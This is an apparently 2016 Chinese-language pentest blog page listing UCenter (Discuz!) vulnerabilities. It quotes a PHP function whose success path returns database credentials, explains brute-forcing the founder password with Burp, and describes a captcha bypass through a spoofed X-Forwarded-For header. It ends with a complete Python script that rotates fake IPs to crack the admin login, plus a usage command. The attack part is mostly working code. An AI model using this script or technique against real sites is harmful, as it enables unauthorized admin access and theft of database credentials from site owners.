<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>
    
      Ucenter vuls list
    
  </title>

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="Ucenter vuls list" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="learn code hack" />
<meta property="og:description" content="learn code hack" />
<link rel="canonical" href="https://blog.securitainment.io/pentest/ucenter/2016/05/14/ucenter-bug-list.html" />
<meta property="og:url" content="https://blog.securitainment.io/pentest/ucenter/2016/05/14/ucenter-bug-list.html" />
<meta property="og:site_name" content="Securitainment.io" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2016-05-14T08:51:04+08:00" />
<script type="application/ld+json">
{"description":"learn code hack","headline":"Ucenter vuls list","dateModified":"2016-05-14T08:51:04+08:00","datePublished":"2016-05-14T08:51:04+08:00","@type":"BlogPosting","url":"https://blog.securitainment.io/pentest/ucenter/2016/05/14/ucenter-bug-list.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.securitainment.io/pentest/ucenter/2016/05/14/ucenter-bug-list.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

  <link type="application/atom+xml" rel="alternate" href="https://blog.securitainment.io/feed.xml" title="Securitainment.io" />

  <link rel="shortcut icon" type="image/x-icon" href="/" />
  <link rel="stylesheet" href="https://blog.securitainment.io/assets/css/main.css" />
</head>
<body>
    <main class="page-content" aria-label="Content">
        <div class="wrapper">
            <a href="https://blog.securitainment.io"></a>
<h1>Ucenter vuls list</h1>
<!--more-->

<ol>
  <li>
    <p>暴力破解创始人密码</p>

    <p>漏洞文件:<code class="language-plaintext highlighter-rouge">/control/app.php:34:onadd</code></p>

    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">function</span> <span class="n">onadd</span><span class="p">()</span> <span class="p">{</span>
     <span class="nv">$ucfounderpw</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'ucfounderpw'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$apptype</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'apptype'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$appname</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'appname'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$appurl</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'appurl'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$appip</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'appip'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$viewprourl</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'viewprourl'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$appcharset</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'appcharset'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$appdbcharset</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'appdbcharset'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$apptagtemplates</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'apptagtemplates'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>
     <span class="nv">$appallowips</span> <span class="o">=</span> <span class="nf">getgpc</span><span class="p">(</span><span class="s1">'allowips'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">);</span>

     <span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$ucfounderpw</span><span class="p">)</span><span class="mf">.</span><span class="no">UC_FOUNDERSALT</span><span class="p">)</span> <span class="o">==</span> <span class="no">UC_FOUNDERPW</span> <span class="o">||</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$ucfounderpw</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="nv">$ucfounderpw</span> <span class="o">==</span> <span class="nb">md5</span><span class="p">(</span><span class="no">UC_FOUNDERPW</span><span class="p">)))</span> <span class="p">{</span>
         <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
         <span class="nv">$return</span>  <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

         <span class="nv">$app</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">db</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">fetch_first</span><span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="no">SELECT</span> <span class="o">*</span> <span class="no">FROM</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mf">.</span><span class="no">UC_DBTABLEPRE</span><span class="mf">.</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">applications</span> <span class="no">WHERE</span> <span class="n">url</span><span class="o">=</span><span class="s1">'$appurl'</span> <span class="k">AND</span> <span class="n">type</span><span class="o">=</span><span class="s1">'$apptype'</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;);</span>

         <span class="k">if</span><span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$app</span><span class="p">))</span> <span class="p">{</span>
             <span class="nv">$authkey</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">_generate_key</span><span class="p">();</span>
             <span class="nv">$apptagtemplates</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$apptagtemplates</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
             <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">db</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">query</span><span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="no">INSERT</span> <span class="no">INTO</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mf">.</span><span class="no">UC_DBTABLEPRE</span><span class="mf">.</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">applications</span> <span class="no">SET</span>
                 <span class="n">name</span><span class="o">=</span><span class="s1">'$appname'</span><span class="p">,</span>
                 <span class="n">url</span><span class="o">=</span><span class="s1">'$appurl'</span><span class="p">,</span>
                 <span class="n">ip</span><span class="o">=</span><span class="s1">'$appip'</span><span class="p">,</span>
                 <span class="n">authkey</span><span class="o">=</span><span class="s1">'$authkey'</span><span class="p">,</span>
                 <span class="n">viewprourl</span><span class="o">=</span><span class="s1">'$viewprourl'</span><span class="p">,</span>
                 <span class="n">synlogin</span><span class="o">=</span><span class="s1">'1'</span><span class="p">,</span>
                 <span class="n">charset</span><span class="o">=</span><span class="s1">'$appcharset'</span><span class="p">,</span>
                 <span class="n">dbcharset</span><span class="o">=</span><span class="s1">'$appdbcharset'</span><span class="p">,</span>
                 <span class="n">type</span><span class="o">=</span><span class="s1">'$apptype'</span><span class="p">,</span>
                 <span class="n">recvnote</span><span class="o">=</span><span class="s1">'1'</span><span class="p">,</span>
                 <span class="n">tagtemplates</span><span class="o">=</span><span class="s1">'$apptagtemplates'</span><span class="p">,</span>
                 <span class="n">allowips</span><span class="o">=</span><span class="s1">'$appallowips'</span>
                 <span class="o">&amp;</span><span class="n">quot</span><span class="p">;);</span>
             <span class="nv">$appid</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">db</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">insert_id</span><span class="p">();</span>

             <span class="nv">$_ENV</span><span class="p">[</span><span class="s1">'app'</span><span class="p">]</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">alter_app_table</span><span class="p">(</span><span class="nv">$appid</span><span class="p">,</span> <span class="s1">'ADD'</span><span class="p">);</span>
             <span class="c1">//$return = &amp;quot;UC_STATUS_OK|$authkey|$appid|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span>
             <span class="nv">$return</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="nv">$authkey</span><span class="o">|</span><span class="nv">$appid</span><span class="o">|&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mf">.</span><span class="no">UC_DBHOST</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBNAME</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBUSER</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBPW</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBCHARSET</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBTABLEPRE</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_CHARSET</span><span class="p">;</span>
             <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">load</span><span class="p">(</span><span class="s1">'cache'</span><span class="p">);</span>
             <span class="nv">$_ENV</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">]</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">updatedata</span><span class="p">(</span><span class="s1">'apps'</span><span class="p">);</span>

             <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">load</span><span class="p">(</span><span class="s1">'note'</span><span class="p">);</span>
             <span class="nv">$notedata</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">db</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">fetch_all</span><span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="no">SELECT</span> <span class="n">appid</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">charset</span><span class="p">,</span> <span class="n">synlogin</span><span class="p">,</span> <span class="n">extra</span> <span class="no">FROM</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mf">.</span><span class="no">UC_DBTABLEPRE</span><span class="mf">.</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">applications</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;);</span>
             <span class="nv">$notedata</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">_format_notedata</span><span class="p">(</span><span class="nv">$notedata</span><span class="p">);</span>
             <span class="nv">$notedata</span><span class="p">[</span><span class="s1">'UC_API'</span><span class="p">]</span> <span class="o">=</span> <span class="no">UC_API</span><span class="p">;</span>
             <span class="nv">$_ENV</span><span class="p">[</span><span class="s1">'note'</span><span class="p">]</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">add</span><span class="p">(</span><span class="s1">'updateapps'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$notedata</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
             <span class="nv">$_ENV</span><span class="p">[</span><span class="s1">'note'</span><span class="p">]</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="nf">send</span><span class="p">();</span>
         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
             <span class="c1">//$return = &amp;quot;UC_STATUS_OK|$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span>
             <span class="nv">$return</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="nv">$app</span><span class="p">[</span><span class="n">authkey</span><span class="p">]</span><span class="o">|</span><span class="nv">$app</span><span class="p">[</span><span class="n">appid</span><span class="p">]</span><span class="o">|&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mf">.</span><span class="no">UC_DBHOST</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBNAME</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBUSER</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBPW</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBCHARSET</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_DBTABLEPRE</span><span class="mf">.</span><span class="s1">'|'</span><span class="mf">.</span><span class="no">UC_CHARSET</span><span class="p">;</span>
         <span class="p">}</span>
         <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
         <span class="k">exit</span><span class="p">(</span><span class="nv">$return</span><span class="p">);</span>
     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
         <span class="k">exit</span><span class="p">(</span><span class="s1">'-1'</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
</code></pre></div>    </div>

    <p>这个函数的意思是 添加一个应用,前提是需要创始人的密码。如果密码正确,就会添加一个应用（如果重复了就直接输出）。</p>

    <p>如何利用：</p>

    <p><img src="http://www.0-f.org/wp-content/uploads/2014/12/Disc_.jpg" alt="" /></p>

    <p>截获个数据包然后放入burp中添加密码字典进行批量破解。
 成功会返回添加应用的信息，反之返回 -1。
 在一些网站中往往把 uc_server/admin.php做了访问限制.
 而index.php这里就可以直接调用破解。返回的应用信息还可以直接getshell或注入。
 测试版本：Discuz! X3.2 搭载的 UCenter 1.6.0</p>
  </li>
  <li>
    <p>暴力破解创始人密码02</p>

    <p>后台地址一般为：<code class="language-plaintext highlighter-rouge">**.**.**.**/discuz/uc_server/admin.php</code></p>

    <p><img src="http://www.wooyun.org/upload/201410/2106555215e9de33121ac345e389897e7a033bb1.png" alt="" /></p>

    <p>含有一个验证码，验证码的地址为：</p>
    <blockquote>
      <p>http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500</p>
    </blockquote>

    <p>但是，经过测试发现，登录uc_server的时候 如果ip第一次出现那么 seccode的默认值为cccc，而 ip地址 是通过X-Forwarded-For 获取的。也就是我们修改xff的ip之后，再次打开上面那个验证码url，图片的值为cccc</p>

    <p><img src="http://www.wooyun.org/upload/201410/21071436735b1f7ae3a6d308d74b2a37b80b090e.png" alt="" /></p>

    <p>所以可以写一个程序通过修改X-Forwarded-For的值爆破密码。</p>

    <poc>

 ```python
 # -*- coding:utf-8-*-

 import httplib,re,random,urllib,time,requests
 import sys
 from sys import argv
 from bs4 import BeautifulSoup

 # Boom
 def getHtml(host, htmlhash, htmlpass, htmlseccode):
     url = 'http://' + host + '/uc_server/admin.php?m=user&amp;a=login'
     ip = str(random.randint(1,100)) + "." + str(random.randint(100,244)) + "." + str(random.randint(100,244)) + "." + str(random.randint(100,244))

     postHead = {'host': host,
                 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Language': 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
                 'X-Forwarded-For': ip,
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Connection': 'keep-alive' }
     postContent = 'sid=&amp;formhash=' + htmlhash + '&amp;seccodehidden=' + htmlseccode + '&amp;iframe=0&amp;isfounder=1&amp;password=' + htmlpass + '&amp;seccode=cccc&amp;submit=%E7%99%BB+%E5%BD%95'
     # resultHtml = httplib.HTTPConnection(host, 80, False)
     # resultHtml.request('POST', '/uc_server/admin.php?m=user&amp;a=login',
     #                    body = postContent,
     #                    headers = postHead )
     # page = resultHtml.getresponse()
     # pageConect = page.read()
     page = requests.post(url, headers = postHead, data = postContent)
     print str(page.status_code) + '\t' + str(page.history) + '\t' + htmlpass
     pageConect = page.text
     pageSoup = BeautifulSoup(pageConect, "lxml")
     pageTitle = pageSoup.title.string
     return pageTitle,page.status_code

 # Get formhash and seccodehidden
 def gethashs(host):
     url = 'http://' + host + '/uc_server/admin.php'
     pageContent = requests.get(url).text
     r1 = re.compile(r'<input type="hidden" name="formhash" value="(\S+)" />')
     htmlhash = r1.findall(pageContent)[0]
     r2 = re.compile(r'<input type="hidden" name="seccodehidden" value="(\S+)" />')
     htmlseccode = r2.findall(pageContent)[0]
     return htmlhash + ' ' + htmlseccode

 # Get host/dict/sleeptime
 if(len(argv)==1):
     print '----&gt;python ' + argv[0] + ' host dictfile sleeptime'
     print '----&gt;python ' + argv[0] + ' **.**.**.** pass.txt 0.2'
 else:
     host = argv[1]
     passfile = argv[2]
     sleeptime = argv[3]
     print '---&gt;host:\t' + host
     print '---&gt;password file:\t' + passfile
     print '---&gt;sleeptime:\t' + sleeptime

     print '---&gt;\n'

     x = gethashs(host).split(' ')
     f = open(passfile, 'r')
     htmlpass = f.readlines()
     # temp = htmlpass[:]
     # nf = open('temp.new', 'w')

     f.close()

     for i in range(len(htmlpass)):
         pwd = str(htmlpass[i].split())
         time.sleep(float(sleeptime))

         try:
             if(getHtml(host, x[0], pwd, x[1])[0] == ''):
                 print '----&gt;Password is: ' + pwd
                 break
         except:
             print sys.exc_info()[0]
     #     finally:
     #         temp.remove(htmlpass[i])
     #     if i == 1:
     #         raise NameError('test')

     # nf.writelines(temp)

     # f.close()
     # nf.close()


         # except:
         #     time.sleep(5.0)
         #     result = getHtml(host, x[0], pwd, x[1])
         # if(result[0] == "UCenter Administrator's Control Panel"):
         #     continue
         # elif 5 in result[1]:
         #     continue
         # else:
         #     print '----&gt;Password is: ' + pwd
         #     break
 ```

 `python dz.py **.**.**.** pass.txt 0`

 ![](http://www.wooyun.org/upload/201410/21065832e3c6315987a3a5ba66db3d66ae619422.png)

</poc>
  </li>
</ol>
<p>3.</p>

<br/><p>Comments:</p>

<script src="https://utteranc.es/client.js"
        repo="5cr1pt/commnets.blog.securitainment.io"
        issue-term="url"
        theme="preferred-color-scheme"
        crossorigin="anonymous"
        async>
</script>

<div style="display:none">
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-137221448-1', 'auto');
    ga('send', 'pageview');

  </script>
</div>

        </div>
    </main>

    
    </body>
</html>
